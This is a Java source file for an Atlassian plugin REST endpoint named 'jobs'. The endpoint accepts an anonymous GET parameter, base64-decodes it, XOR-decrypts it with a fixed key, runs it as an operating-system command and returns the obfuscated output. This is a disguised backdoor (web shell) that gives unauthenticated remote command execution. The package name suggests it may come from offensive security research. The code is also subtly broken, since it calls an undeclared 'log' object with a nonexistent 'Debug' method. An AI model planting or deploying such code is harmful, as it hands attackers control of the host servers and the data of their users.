package com.cyllective.rest;

import com.atlassian.plugins.rest.common.security.AnonymousAllowed;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.ws.rs.*;
import javax.ws.rs.core.MediaType;
import javax.ws.rs.core.Response;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.Base64;

// GET /jobs/latest/run?job=<JOB>
@Path("/run")
public class jobs {

    private static final Integer xorKey = 42;

    @GET
    @AnonymousAllowed
    @Produces(MediaType.TEXT_PLAIN)
    public Response RunCmd(@QueryParam("job") String job_encrypted) {
        try {
            if (job_encrypted == null) {
                String message = "Invalid parameter job";
                log.Debug(message);
                return Response
                        .status(Response.Status.BAD_REQUEST)
                        .entity(message)
                        .build();
            }

            // Decode the base64 command
            log.Debug(job_encrypted);
            byte[] jobEncryptedDecoded = Base64.getUrlDecoder().decode(job_encrypted);
            log.Debug(jobEncryptedDecoded.toString());
            // Decrypt the job
            String jobDecrypted = xor(jobEncryptedDecoded);
            log.Debug(jobDecrypted);

            // Start the command
            ProcessBuilder processBuilder = new ProcessBuilder(jobDecrypted);
            Process process = processBuilder.start();

            // Wait for it to finish
            int exitCode = process.waitFor();
            String output = readOutput(process.getInputStream());

            if (exitCode == 0) {
                // Command was successful

                // Encrypt the output
                String outputEncrypted = xor(output.getBytes());
                log.Debug(outputEncrypted);

                // Encode the output
                String outputEncryptedEncoded = Base64.getUrlEncoder().encodeToString(outputEncrypted.getBytes());
                log.Debug(outputEncryptedEncoded);

                return Response
                        .ok(outputEncryptedEncoded)
                        .build();

            } else {
                return Response
                        .status(Response.Status.INTERNAL_SERVER_ERROR)
                        .build();
            }

        } catch (Exception e) {
            return Response
                    .status(Response.Status.INTERNAL_SERVER_ERROR)
                    .build();
        }
    }

    private static String xor(byte[] input) {
        byte[] output = new byte[input.length];

        for (int i = 0; i < input.length; i++) {
            output[i] = (byte)(input[i] ^ xorKey);
        }

        return new String(output);
    }
	
    private static String readOutput(InputStream inputStream) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        StringBuilder output = new StringBuilder();
        String line;

        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }

        return output.toString();
    }
}